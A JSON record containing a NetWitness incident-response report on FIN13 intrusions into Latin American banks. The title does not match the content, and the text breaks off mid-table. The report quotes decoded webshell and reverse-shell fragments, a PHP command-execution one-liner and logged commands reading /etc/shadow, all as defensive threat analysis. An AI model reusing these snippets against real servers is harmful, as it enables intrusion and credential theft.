{
    "id": "05639583-aff2-4c29-b316-5a5f0ec5c821",
    "created_at": "2022-10-25T16:48:20.131021Z",
    "updated_at": "2025-03-27T02:17:00.358148Z",
    "deleted_at": null,
    "sha1_hash": "0eae1569a895f6c5c299a44de8f5cab5630ac0b8",
    "title": "NetWitness Platform Evolved SIEM Solution Brief",
    "authors": "",
    "file_creation_date": "2022-07-18T13:04:32Z",
    "file_modification_date": "2022-07-29T14:06:00Z",
    "file_size": 4538793,
    "plain_text": "# FIN13 (Elephant Beetle): Viva la Threat! Anatomy of a Fintech Attack\n\n## By the NetWitness Incident Response and FirstWatch Threat Intelligence teams\n\n\n### Stefano Maccaglia\n#### Practice Manager, Incident Response\n\n### Will Gragido\n#### Head of Threat Research Intelligence Content Director, Product Management\n\n\n-----\n\n### Table of Contents\n\n##### Table of Figures\n\n Introduction\n\n What’s In a Name? FIN13 (Elephant Beetle or TG2003)\n\n Preferred Tooling and Tactics, Techniques, and Procedures (TTPs)\n\n Attack description \n\n Initial exploitation: Oracle WebLogic Server Deserialization RCE \n\n Initial Compromise\n\n The Webshell:\n\n Extended compromise \n\n Domain credential harvesting \n\n The Attack Outcome: Online Banking Fraud\n\n Conclusion\n\n Appendix A: attacker tools\n\n PowerShell HTTP Bind shell (BlueAgave)\n\n Perl Bind Shell (BlueAgave) \n\n PHP Webshell \n\n S0b.j / S0b.Jar\n\n RawCap\n\n\n-----\n\n### Table of Figures\n\nFigure 1: FIN13 attack sequence\n\nFigure 2: Example of scan activity initiated by the FIN13 Team against the first victim detected\n\nFigure 3: Initial sequence of events associated with the attack\n\nFigure 4: HTTP POST request injecting the payload\n\nFigure 5: Data from WebLogic Registry.xml\n\nFigure 6: Serialization/deserialization process\n\nFigure 7: Deserialization attack\n\nFigure 8: Evidence of webshell upload after Oracle WebLogic exploitation\n\nFigure 9: Initial compromise\n\nFigure 10: Attack Stage 1\n\nFigure 11: Attacker uploading a zip archive containing malicious tools via the implanted webshell\n\nFigure 12: Attack Stage 2\n\nFigure 13: Webshell details allowing classification\n\nFigure 14: Logs of attacker attempt to gain persistence\n\nFigure 15: Port scanner arguments\n\nFigure 16: Port scanner output\n\nFigure 17: Attacker scans the core networks\n\nFigure 18: Malicious tools found in Zabbix server\n\nFigure 19: Attack Stage 3 - attacker hunting for credentials\n\nFigure 20: Recovered files from Oracle IAM server lv_wls volume\n\nFigure 21: Attack Stage 3 - attacker moves laterally\n\nFigure 22: Attack Stage 3 - attacker prepares to move to core networks\n\nFigure 23: Obfuscated PowerShell service\n\nFigure 24: Decoded PowerShell payload\n\nFigure 25: Excerpt of log activity\n\nFigure 26: Attack Stage 3 - attacker harvests data to prepare the fraud\n\nFigure 27: Terminal server logs for SQL Server\n\nFigure 28: Enrollment token records\n\nFigure 29: Second case, attack initial phase\n\nFigure 30: Evidence of dumped LSASS.exe process executed on December 11, 2021\n\nFigure 31: Evidence of dumped LSASS.exe process executed on December 19, 2021\n\n\n6\n\n7\n\n8\n\n8\n\n9\n\n9\n\n10\n\n10\n\n11\n\n11\n\n12\n\n13\n\n13\n\n15\n\n16\n\n16\n\n16\n\n17\n\n18\n\n18\n\n18\n\n19\n\n19\n\n20\n\n20\n\n21\n\n22\n\n22\n\n23\n\n23\n\n24\n\n\n-----\n\n### Table of Figures\n\nFigure 32: Attack second phase – attacker extends the compromise\n\nFigure 33: LSASS dump NT credentials\n\nFigure 34: SSP entry w/ RBMAdmin account\n\nFigure 35: Examples of DB browser configuration files recovered from RBSCLPED01 server\n\nFigure 36: Attacker moves against the domain servers\n\nFigure 37: PSEXESVC service creation\n\nFigure 38: VBS script and related artifacts\n\nFigure 39: Database password in base64 encoding\n\nFigure 40: ShimCache evidence of PSExec execution\n\nFigure 41: PSEXESVC service creation event\n\nFigure 42: MFT record of psexec64.exe file\n\nFigure 43: CCfix.bat\n\nFigure 44: CCfixA.bat\n\nFigure 45: PsExec64 used to enable RDP\n\nFigure 46: Attacker activates a PERL Reverse Shell\n\nFigure 47: 65.txt decoded contents\n\nFigure 48: Additional 65.txt decoded contents\n\nFigure 49: Final segment of 65.txt decoded code\n\nFigure 50: Example of 65.txt perl backdoor interaction\n\nFigure 51: Webshell details allowing classification\n\nFigure 52: S0b Arguments\n\nFigure 53: Configuration Class Properties\n\nFigure 54: /srv/www/htdocs/gif/str-isis.txt Contents\n\nFigure 55: /srv/www/htdocs/gif/str-bio.txt Contents\n\nFigure 56: RawCap (0.2.0.0)\n\nFigure 57: RawCap (0.1.5.0)\n\n\n24\n\n25\n\n25\n\n26\n\n27\n\n27\n\n28\n\n28\n\n28\n\n28\n\n29\n\n29\n\n30\n\n30\n\n31\n\n32\n\n33\n\n34\n\n35\n\n36\n\n37\n\n37\n\n37\n\n38\n\n38\n\n38\n\n\n-----\n\n### Introduction\n\nThe NetWitness Incident Response (IR) Team has a long and notable history of working on complex cases across industry sectors\nand verticals worldwide. Throughout its history, the IR team has encountered a wide array of threats and actors dating back to its\nearliest start-up days. From time to time, certain engagements stand out more so than others. In some instances, it is the victim\nwho is of special interest to the team. Or it is the nature of the case – the target(s), the tooling and infrastructure observed and\nanalyzed during the investigation, or the behavioral patterns identified and observed within the victim environment. In other\nsituations, it is the TTPs which capture our attention and engage us in deep and rigorous analysis. And, in still other instances, it is\nthe threat actor who captures our attention as was the case recently when the team was engaged in Latin America in response to\nattacks that began in March of 2021.\n\nDuring a recent lull in activity between engagements, the NetWitness Incident Response Team became aware of two intriguing\ncases unlike any which we had seen up to this point in time. What made them unique was the advent of a previously unknown\nthreat actor which linked both cases (and their subsequent victims) of which we were previously unaware. The attacks in questions\ntargeted the financial vertical, specifically two banks in Latin America. During these attacks, the threat actors in question showed\nsignificant sophistication and technical knowledge beyond what we have observed as being typical for the type of actor and their\ntraditional targets. Unlike other threat actors that we have encountered within our past engagements who tend to focus on\nPoint of Sale (PoS) fraud, phishing / spear phishing campaigns, mobile banking application exploitation, and basic credential theft\nand exploitation (all of which are far more common than active targeting and attempts at compromising banking infrastructure),\nthe threat actors observed in the two aforementioned cases demonstrated that these actors were operating from a more\nadvanced playbook.\n\nExamples of this could be seen in activities where we observed the threat actors in question attempting to leverage vulnerability\nexploitation of the victim’s multi-factor authentication (MFA) solution: RSA SecurID One Time Password (OTP) offering, deployed\nby the victims to protect their remote banking customers. It should be noted that we found no evidence to suggest that the\nthreat actors were successful in directly exploiting the SecurID platform despite the fact that they were observed using a\nknown exploitation designed to result in the compromise of SecurID tokens that have been implemented in a suboptimal\nmanner. We believe this is an indication of the threat actors technical experience with and exposure of modern multi-factor\nauthentication capabilities.\n\nFurthermore, it is our professional opinion that this is not indicative of capabilities we have observed in other financial vertical\ncases we have worked on in the region, largely due to the fact that in order to successfully exploit and compromise the financial\ninstitutions’ remote banking customers / home-banking MFA, the threat actors in question would need to be able to successfully\nexploit, compromise, and penetrate the financial institutions in question; access the SecurID seeds stored within them located in\nspecific repositories; and collect the corresponding credential information of the remote banking customers in order to\nlater impersonate the remote users to advance their goals in defrauding the victims and their customers. A truly remarkable\nfeat for a cybercriminal gang.\n\n#### What’s In a Name? FIN13 (Elephant Beetle or TG2003)\n\nThis malicious group is FIN13. They are also referred to at times as “Elephant Beetle” or more simply as “TG2003”. Through\nanalyzing both cases in detail, the NetWitness Incident Response and FirstWatch Threat Intelligence conclude that both the\nidentity of the threat actor is accurate as are its patterns of behavior. To date and the time of this writing, there is no official\nnomenclature that defines and describes FIN13 in the MITRE ATT&CK framework. However, both Mandiant and Sygnia have\nreported on the attacker in the past and have highlighted several common traits that we have also seen during the course of\nanalysis. As mentioned in the introduction section of this paper, it is noteworthy that FIN13’s efforts in selecting targets are both\nhighly localized and we see them targeting and impacting large organizations in the financial, retail, and hospitality verticals. This\ndifferentiates FIN 13 further from other threat actors that are principally financially motivated. Additionally, FIN13 has been\nobserved and is known to conduct lengthy attacks and operations against their intended targets. The results of the patience\ndemonstrated by FIN13 in these instances varies, however their approach has afforded them the time to collect information\nnecessary for executing fraudulent money transfers and other activities.\n\n\n-----\n\n#### Preferred Tooling and Tactics, Techniques, and Procedures (TTPs)\n\nFIN13 has a known affinity and reliance upon attack frameworks such as Cobalt Strike. Additionally, FIN13 makes extensive\nuse of custom backdoors of their own design and other tools in order to achieve a foothold and persistence within their victim’s\nenvironments resulting in the threat actor being able to enjoy lengthy dwell time and the freedom to move throughout the\nenvironment without hindrance. Through our investigation, research, and analysis of the two cases, we have studied the\nfollowing TTPs and patterns of behavior have been observed and recorded:\n\n - Active exploitation of Linux machines through vulnerable Java-based applications\n\n - Extensive adoption of Web Shells\n\n - Adoption and use of off the shelf, common penetration testing/red teaming tools that have been repurposed and\ncustomized to support their attacks and operations\n\n - A significant use of scripted scanning techniques used to conduct deeper reconnaissance of the targeted victims in order\nto gain deeper understanding and knowledge of their network environments\n\n - Advanced knowledge of the RSA SecurID platform and misconfigurations that can enable a determined threat\nactor to gain salient detail and information necessary for impersonation attacks conducted against the victims and their\ncustomers\n\n#### Typical FIN13 Attack Process\n\nThe following figure depicts the traditional strategy used by the attacker:\n\n                                                       - Command & Control                                                        - Remote Command\n\n                                                          - Remote Access Execution\n\n                                                          - Account Abuse                                                          - Remote\n\nAdministration\n\nInitial Escalation of Scan, Lateral Exfiltration,\n\nReconnaissance Persistence\n\nCompromise Priveleges Movements Entrenchment\n\n         - Open          - Internet-based          - Webshells          - Credential          - Network Scanning          - Data Staging\n\nSource Intelligence attack         - Backdoors Harvesting         - System Enumeration         - Data Exfiltration\n\n       - Scanning        - Social Engineering        - Tunneling        - Password Cracking        - Network Shares        - Data Modification\n\n         - Credential         - Pass-the-Hash Enumerations         - Data Destruction\n\nHarvesting         - Account and\n\nPassword\nEnumeration\n\nFigure 1: FIN13 attack sequence\n\nAs we have discussed, FIN 13 has an affinity for Java-based attacks. In the two cases we were engaged in, FIN13 targeted\nlegacy Java applications running on Linux-based machines as a means of initial entry to the environment. In one of our cases\nthe exploit used was targeting Oracle WebLogic Server Deserialization RCE (CVE-2019-2729) which is aligned with recently\nreported cases (from Mandiant Report). Interestingly, in the second case, the attacker exploited the Log4j vulnerability (CVE2021-44228) to land upon a web server, which is a widely adopted technique for attackers. Additionally, we observed the\ngroup deploying its own complete Java web application onto victim machines in order to establish command and control while\nthe machines were remained operational, running legitimate applications in parallel to this malicious code.\n\n\n-----\n\nSygnia report published on January 2022, cites the following exploits as typically abused by the attacker:\n\n - SAP NetWeaver Invoker Servlet Exploit (CVE-2010-5326)\n\n - Config Servlet Remote Code Execution (EDB-ID-24963)\n\n - WebSphere Application Server SOAP Exploit (CVE-2015-7450)\n\nIn our investigations we observed that once the attacker was able to open a beachhead inside the public facing network of the\nvictims, he deployed generic web shells and custom malware including BLUEAGAVE to establish a foothold.\n\nOther typical tools we saw during the analyses are:\n\n - JSprat Web Shell\n\n - Closewatch Web shell\n\n - Porthole: a java-based network scanner\n\n - SwearJAR backdoor\n\n - BlueAgave bind shell\n\n - Latchkey: PowerSploit script to dump credentials\n\n - Database browsers\n\nIt should be noted that in comparison to many other threat actors we have encountered in our incident response and investigation\nwork, FIN13 has demonstrated (in the two cases that we have been involved in directly) a more mature and sophisticated\napproach to their operations, wherein advanced penetration testing skills and acumen in addition to programmatic skill were\nobserved and noted. This correlates what Sygnia had reported in their body of work on this threat actor as well.\n\n#### Attack description\nInitial exploitation: Oracle WebLogic Server Deserialization RCE\n\nAs mentioned in the introduction, the attacks began during March of 2021, when the attacker attempted to scan the perimeter\nof the victim looking for potential vulnerable webservices. Using our NetWitness Network tooling, we were able to record\nthese scanning attempts, but due to the usual volume of the traffic, the test went unnoticed, hidden in the multitude of similar\nactions conducted by cybercriminals of any sort.\n\nFigure 2: Example of scan activity initiated by the FIN13 Team against the first\nvictim detected by NetWitness Network\n\n\n-----\n\nIn Figure 2 we can see that the scan was executed by the IP address 185.193.126.22. Through rigorous analysis, we were able\nto link the first scan attempt with subsequent activity which started during the month of June 2021. Furthermore, we were\nable to establish that the actor used the same IP address in the second phase of the attack, before uploading a web shell on\nthe exploited Linux system on June 21, 2021, which took place just minutes after the targeted web server was scanned again\nthe actor using the NMAP tool from a source IP address of 185.193.126.22.\n\nAt this time, a different IP address (187.177.170.111) was observed making POST requests to a web page called\n_AsyncResponseServiceHttps._\n\nFigure 3: Initial sequence of events associated with the attack\n\nFigure 4: HTTP POST request injecting the payload\n\n\n-----\n\nOur research supports the conclusion that the attack was successful because the server was running version 12.1.1.0 of WebLogic.\n\n\n<product format=”1.0” name=”WebLogic Platform”>\n<release level=”12.1” ServicePackLevel=”1” PatchLevel=”0” Status=”installed”\nInstallTime=”Nov 20, 2012 6:36:58 PM” InstallDir=”/herramientas/servers/Oracle/Middleware”>\n\n<component name=”Common Infrastructure Engineering” version=”7.4.0.0” InstallDir=””>\n\n<component name=”Uninstall”/>\n<component name=”Patch Client”/>\n<component name=”Patch Attachment Facility”/>\n<component name=”Clone Facility”/>\n</component>\n<component name=”WebLogic Server” version=”12.1.1.0”\nInstallDir=”/herramientas/servers/Oracle/Middleware/wlserver_12.1”>\n\n<component name=”Core Application Server”/>\n<component name=”Administration Console”/>\n\n\nFigure 5: Data from WebLogic Registry.xml\n\nThis vulnerability is due to an issue in the deserialization of content passed to the WebLogic interface from the web server.\nSerialization is the process of converting complex data structures, such as objects and their fields, into a “flatter” format that\ncan be sent and received as a sequential stream of bytes over a network or between different components of an application,\nor in an API call. Crucially, when serializing an object, its state is also persisted. In other words, the object’s attributes are\npreserved, along with their assigned values. Once the stream of bytes reaches its destination, a deserialization process\nis executed restoring this byte stream to a fully functional replica of the original object, in the exact state as when it was\nserialized. The website’s logic can then interact with this deserialized object, just like it would with any other object.\n\nFigure 6: Serialization/deserialization process\n\n\n-----\n\nIf, before or during the deserialization process one or more objects are modified, this modification will affect the outcome of\nthe process, instancing potentially a different object than the originally sent.\n\nFigure 7: Deserialization attack\n\nInsecure deserialization is when user-controllable data is deserialized by a website, such as in the Oracle vulnerability, where an\nattacker, manipulating the serialized objects, can pass harmful data into the application code. It is even possible to\nreplace a serialized object with an object of an entirely different class. Alarmingly, objects of any class that is available\nto the website will be deserialized and instantiated, regardless of which class was expected. For this reason, insecure\ndeserialization is sometimes known as an “object injection” vulnerability. This remote code execution vulnerability is\nexploitable without authentication, through the interaction with a vulnerable web server instancing the page: web page called\n“AsyncResponseServiceHttps” passing via POST message malicious content, without the need for a username and password.\n\nSubsequent requests from the actor were checking the availability of files dropped by the actor:\n\n\n187.177.170.111 [21/Jun/2021:14:39:55 -0500] “GET /wls-wsat/CoordinatorPortType HTTP/1.1” 404 1164\n187.177.170.111 [21/Jun/2021:14:40:01 -0500] “GET /favicon.ico HTTP/1.1” 404 1164\n187.177.170.111 [21/Jun/2021:14:40:04 -0500] “GET /_async HTTP/1.1” 302 265\n187.177.170.111 [21/Jun/2021:14:40:09 -0500] “GET /_async/ HTTP/1.1” 403 1166\n187.177.170.111 [21/Jun/2021:14:41:07 -0500] “GET /_async/AsyncResponseServiceHttps HTTP/1.1” 200 348\n187.177.170.111 [21/Jun/2021:14:41:20 -0500] “GET /.beamarker.dat HTTP/1.1” 404 1164\n187.177.170.111 [21/Jun/2021:14:41:24 -0500] “GET /_async/.beamarker.dat HTTP/1.1” 200 1\n187.177.170.111 [21/Jun/2021:14:42:51 -0500] “GET /bea_wls_internal/ HTTP/1.1” 200 49\n187.177.170.111 [21/Jun/2021:14:43:00 -0500] “GET /bea_wls_internal/weblogic.txt HTTP/1.1” 404 1164\n187.177.170.111 [21/Jun/2021:14:43:06 -0500] “GET /bea_wls_internal/.weblogic.txt HTTP/1.1” 404 1164\n187.177.170.111 [21/Jun/2021:14:44:29 -0500] “GET /_async/AsyncResponseServiceHttps HTTP/1.1” 200 348\n187.177.170.111 [21/Jun/2021:14:45:46 -0500] “POST /_async/AsyncResponseServiceHttps HTTP/1.1” 202 187.177.170.111 [21/Jun/2021:14:46:17 -0500] “GET /_async/.beamarker.dat.txt HTTP/1.1” 404 1164\n187.177.170.111 [21/Jun/2021:14:47:04 -0500] “GET /_async/.beamarker.dat.txt HTTP/1.1” 404 1164\n187.177.170.111 [21/Jun/2021:14:47:57 -0500] “POST /_async/AsyncResponseServiceHttps HTTP/1.1” 200 801\n187.177.170.111 [21/Jun/2021:14:48:36 -0500] “GET /bea_wls_internal/weblogic.txt HTTP/1.1” 404 1164\n187.177.170.111 [21/Jun/2021:14:51:07 -0500] “POST /_async/AsyncResponseServiceHttps HTTP/1.1” 202 **187.177.170.111 [21/Jun/2021:14:51:18 -0500] “GET /bea_wls_internal/test.txt HTTP/1.1” 200 11**\n187.177.170.111 [21/Jun/2021:14:53:22 -0500] “POST /_async/AsyncResponseServiceHttps HTTP/1.1” 202 187.177.170.111 [21/Jun/2021:14:53:30 -0500] “POST /_async/AsyncResponseServiceHttps HTTP/1.1” 202 187.177.170.111 [21/Jun/2021:14:54:07 -0500] “POST /_async/AsyncResponseServiceHttps HTTP/1.1” 202 **187.177.170.111 [21/Jun/2021:14:54:13 -0500] “GET /bea_wls_internal/test3.txt HTTP/1.1” 200 493**\n187.177.170.111 [21/Jun/2021:14:54:37 -0500] “POST /_async/AsyncResponseServiceHttps HTTP/1.1” 202 **187.177.170.111 [21/Jun/2021:14:54:45 -0500] “GET /bea_wls_internal/.weblog.jsp HTTP/1.1” 200 2**\n187.177.170.111 [21/Jun/2021:14:55:01 -0500] “GET /bea_wls_internal/.weblog.jsp HTTP/1.1” 200 7\n187.177.170.111 [21/Jun/2021:14:55:13 -0500] “GET /bea_wls_internal/.weblog.jsp HTTP/1.1” 200 2\n187.177.170.111 [21/Jun/2021:14:55:26 -0500] “GET /bea_wls_internal/.weblog.jsp HTTP/1.1” 200 23946\n187.177.170.111 [21/Jun/2021:14:56:56 -0500] “GET /bea_wls_internal/.weblog.jsp HTTP/1.1” 200 165\n187.177.170.111 [21/Jun/2021:14:58:29 -0500] “GET /bea_wls_internal/.weblog.jsp HTTP/1.1” 200 2\n187.177.170.111 [21/Jun/2021:15:01:24 -0500] “POST /bea_wls_internal/.webout.jsp HTTP/1.1” 200 50\n\n\nFigure 8: Evidence of webshell upload after Oracle WebLogic exploitation\n\n\n-----\n\nAfter uploading and requesting a couple of test pages, the actor can be seen accessing the first webshell called “.weblog.jsp.”\nSubsequently, the actor moved to numerous additional systems in the DMZ, looking to extend the radius of his attack.\n\nInitial Compromise\n\nWeblog.jsp is jspRAT, a webshell – a JavaServer page (JSP) backdoor that can manipulate files and directories. This backdoor\ncan run arbitrary Windows commands and that was the initial interaction conducted by the attacker. Below we can see the set\nof initial commands executed by the actor attempting a recon to the DMZ segment where the infected system was operating:\n\nFigure 9: Initial compromise\n\nAt the end of this phase, the attacker downloaded an archive of malicious executables for different operating systems looking\nto use the machine as a staging point for the next phases of the attack.\n\nFigure 10: Attack Stage 1\n\n\n-----\n\nThe Zip archive contained:\n\n - BlueAgave, a PowerShell HTTP Bind Shell \n - A Perl version of BlueAgave\n\n - A PHP webshell\n\n - A Java Database browser\n\n - A Java Scanner (PortHole)\n\n - A Java packet capture tool (RawCap)\n\n - SpinOff SQL Browser\n\n - A Powersploit script to dump the lsass.exe process (Latchkey)\n\nWe will discuss these tools in the section dedicated to tooling in Appendix A: attacker tools.\n\nFigure 11: Attacker uploading a zip archive containing malicious tools via the implanted webshell\n\nFrom the attack perspective, once the attacker obtained the breach head to the corporate network, he halted temporarily any\nadditional activity and stay below the radars for about a week.\n\nUsually, this tactic is used when the actor carefully approaches an environment, knowing the network includes several different\ntypes of detection tools that could alert the victim. In these cases, a sophisticated attacker waits before moving to the next stages\nof the attack.\n\n\n-----\n\nOn June 27, 2021, the attacker accessed the webshell again and with a common credential between, he moved laterally to the\nZabbix server (A DMZ Monitoring service) and implanted WSO webshell a PHP webshell on the system:\n\nFigure 12: Attack Stage 2\n\nWhile the Oracle WebLogic server was having a limited set of network permissions, Zabbix was allowed to communicate with\na significant subset of additional networks. In addition, the Zabbix server was not publishing its web interface on a standard\nport, but thanks to a misconfiguration on the perimeter firewall, the attacker was able to put the webshell accessible from\nInternet by publishing it on a public IP belonging to the victim IPv4 public address space on port TCP/80.\n\n### The Webshell:\n#### Chart10.php (hash SHA1: 12088138171164c0c256f608b434eb73c0c957d7)\n\nWSO is common web shell among cybercriminals. it is designed to be used via a web browser, and it has a simple user-friendly\ninterface, making it quite easy for any attacker to learn and to use. WSO stands for “web shell by oRb.,” usually this string is present\nin the Web Shell code. Initially reported in 2009, it comes from Russian developers, and it was originally proposed by a user named\noRb, on a Russian underground community in 2008. oRb, the developer, continued to post updates and new versions of the script\nand the community published a number of major releases, until in 2019 WSO reached version 4.1.3. However, the most popular\nversions are version 2.1 and version 2.5.\n\nIn our case, the Web shell version is 2.1 as highlighted in the following figure:\n\nFigure 13: Webshell details allowing classification\n\n\n-----\n\nThe Webshell showed a number of peculiar traits:\n\n\n\\”aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2\nF0b24oJHR\\”.\n\n\nThis is translated in the following instructions:\n\n\nho “`id`”;/bin/sh’;\n$0=$cmd;\n$target=$ARGV[0];\n$port=$ARGV[1];\n$iaddr=inet_aton($t\n\n\nWhich in turn, is a basic instancing of the command injection used by the Web shell.\n\n\n\\”KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb\n3NlKFNUREl\\”.\n\n\nOnce translated it appears as:\n\n\n);\nopen(STDOUT, “>&SOCKET”);\nopen(STDERR, “>&SOCKET”);\nsystem($system);\nclose(STDI\n\n\nThis redirect stdout to a socket to ensure functionality for the reverse shell.\nThe following piece of the Web shell code, instead,\n\n\n\\”Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==\\”;\n\n\nDecoded it looks like this:\n\n\n;\n\ndup2(fd, 2);\nexecl(“/bin/sh”,”sh -i”, NULL);\nclose(fd);\n}\n\n\nIt is used to sync the input and the output from web shell. Malicious activity was identified within the sudo log files on Zabbix.\nMinutes before the “chart10.php” was created on the filesystem there were multiple sudo entries associated with the Zabbix\naccount that appear to be attacker-related.\n\nSome of the threat actor activity includes attempting to upload a simple webshell, viewing the “/etc/shadow” file, finding and\nmodifying the permissions to the “/srv/www/htdocs/gif” folder, and running “whoami”.\n\nEvidence of the attacker attempting a drop a web shell in these commands may suggest he did not have persistent access to\nthis system. Thus, these commands might have been executed through a command injection vulnerability.\n\n\n-----\n\n|Datetime (CDT)|Log Entry|Source|\n|---|---|---|\n|2021-06-22 T14:34:17|[sudo] zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/echo PD9waHAKc3lzdGVtKCRfUkVRVUVTVFsnY20nXSk7Cj8+ICAgCg==|syslog|\n|2021-06-22 T14:36:49|[sudo] zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/find /srv/www/ htdocs/ -perm -2 -ls|syslog|\n|2021-06-22 T14:37:26|[sudo] zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/find /srv/www/ htdocs/ -perm -2 -ls|syslog|\n|2021-06-22 T14:40:25|[sudo] zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/find /srv/www/ htdocs/ -perm -2 -ls|syslog|\n|2021-06-22 T14:41:33|[sudo] zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow|syslog|\n|2021-06-22 T14:44:20|[sudo] zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/ls -lahR / srv/www/htdocs/|syslog|\n|2021-06-22 T14:45:20|[sudo] zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/whoami|syslog|\n|2021-06-22 T14:46:46|[sudo] zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/chmod 777 / srv/www/htdocs/gif|syslog|\n|2021-06-22 T14:47:08|[sudo] zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/ls -lah / srv/www/htdocs/|syslog|\n|2021-06-22 T14:48:05|[sudo] zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/echo <?php system($_REQUEST[“cm”]); ?> /srv/www/htdocs/gif/output.php|syslog|\n|2021-06-22 T14:48:38|[sudo] zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/echo <?php system($_REQUEST[“cm”]); ?>|syslog|\n|2021-06-22 T18:11:34|[sudo] zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/ls -lah /var/log/|syslog|\n|2021-06-22 T18:11:56|[sudo] zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/ls -lah /var/log/|syslog|\n|2021-06-22 T18:12:19|[sudo] zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/ls -lah /var/log/|syslog|\n|2021-06-22 T18:13:16|[sudo] zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/ls -lah / var/log/apache2/|syslog|\n|2021-06-22 T18:26:20|[sudo] zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/dev/shm/65510|syslog|\n\n\nFigure 14: Logs of attacker attempt to gain persistence\n\nAdditionally, the actor was observed viewing the contents of the Apache log folder “/var/log/apache2/”.\n\nGiven the actor observed interest, it is likely they removed the entries of the access logs.\n\nLastly, the threat actor is checking for a file called 65510 in “/dev/shm”. This happens to be the port configured for attacker’s\nBlueAgave Perl webshell called “65.txt”. At this point the attacker gained a second and direct channel to a key system allowed\nto communicate beyond the DMZ boundaries.\n\nExtended compromise\n\nA few hours after the actor acquired the control of the Zabbix system, he started to scan the networks in order to gain a\ndetailed view of the system’s visibility. The actor then began launching massive ping sweeps against private subnets and, for\nany responding machine, he scripted the activation of a port scan aimed to verify the first 10.000 TCP ports. To execute the\nscan, the attacker imported the Java Scanner known as PortHole from the Oracle WebLogic server.\n\n\n-----\n\nPortHole is a simple port scanner to identify open ports based on the target and range provided within the commandline arguments.\n\nFigure 15: Port scanner arguments\n\nThe result output is programed to print to the stdout of console that it is running in:\n\nFigure 16: Port scanner output\n\nDuring the investigation, we found several txt files in the unallocated address space of the Zabbix machine that were the\nredirected outputs of these scanning attempts.\n\nFigure 17: Attacker scans the core networks\n\n\n-----\n\nDue to the fact these scans occurred inside the network, Netwitness platform was not able to intercept and report them,\nlacking the DMZ-to-Internal visibility.\n\nDomain credential harvesting\n\nThe scan of the Backend DMZ Lan allowed the actor to identify a Domain Controller of the victim’s Domain Forest which became\nthe next target of the attacker. FIN13 took some time before attacking it, to ensure staying undetected by waiting for another\nweek before executing this part of the activity. In addition, in the week passed between the compromise of the Zabbix system\nand the access to the AD server, the attacker transferred additional tools to the Zabbix, from the WebLogic server and worked\nto consolidate his control of the Front-End DMZ by scanning and moving laterally to other systems, using the Zabbix admin\naccount. To attack the AD server, the attacker downloaded a number of tools to the Zabbix server:\n\n**Path** **Creation** **Notes** **MD5**\n\nperl webshell on port\n65.txt June/22/2021 18:25:20 65510. SImilar to 91a7cfb45dc44a91cdc8aecc2f26c181\nPowershell bindshells\n\nchart10.php June/22/2021 19:52:13 Webshell 32deb25a3d7f73ee5f1f38d2e44ef193\n\np.txt June/22/2021 20:52:24 Java Port Scanner f4b56e8b6c0710f1e8a18dc4f11a4edc\n\npr64.zip June/22/2021 21:38:02 procdum64 a92669ec8852230a10256ac23bbf4489\n\nbi.txt June/22/2021 21:42:00 perl bind shell on port 64510 fed35b114e24bf4a88c8b152c02faabb\n\nJar that queries db using\ns0b.j June/22/2021 22:33:44 4bed9c8d06a3ba7215c49f139ca0dd16\nconfig data (str-*.txt files)\n\njdbc connection /\nstr-isis.txt June/22/2021 22:38:55 93acad22e4f91dbc9581377fd9d996e4\ncredential info\n\njtds-1.2.1.jar June/23/2021 21:24:56 likely jdbc driver bc9a0f8026c176ab8afb1b330ef4f781\n\njdbc connection /\nstr-bio.txt June/29/2021 18:22:44 17eb9c943d686a7d7c23266d9cbb3900\ncredential info\n\nFigure 18: Malicious tools found in Zabbix server\n\nThe actor then moved laterally from the Zabbix server to the Oracle Identity Manager server, located in the DMZ. The\nsystem was not exposing interfaces to Internet, but was sharing with Zabbix the root password, thus allowing the attacker to\naccess it and dump the sysadmin account related to the IAM service.\n\nPassword reuse, unfortunately, is a common wrongdoing in corporate networks. We all know that local accounts with\nadministrator privileges are necessary to be able to run system updates, software upgrades, and hardware usage. They are\nalso helpful to gain local access to machines when the network goes down and when your organization faces some technical\nglitches, however, from a security perspective not managing these accounts properly can have serious repercussions as this\ncase exemplifies.\n\nAs a result, the attacker was able to access the Oracle IAM server administrative UI, by tunneling the interface through SSH,\nvia Zabbix and to dump IAM local database of accounts allowing him to scrape between the accounts to find domain accounts.\n\n|Path|Creation|Notes|MD5|\n|---|---|---|---|\n|65.txt|June/22/2021 18:25:20|perl webshell on port 65510. SImilar to Powershell bindshells|91a7cfb45dc44a91cdc8aecc2f26c181|\n|chart10.php|June/22/2021 19:52:13|Webshell|32deb25a3d7f73ee5f1f38d2e44ef193|\n|p.txt|June/22/2021 20:52:24|Java Port Scanner|f4b56e8b6c0710f1e8a18dc4f11a4edc|\n|pr64.zip|June/22/2021 21:38:02|procdum64|a92669ec8852230a10256ac23bbf4489|\n|bi.txt|June/22/2021 21:42:00|perl bind shell on port 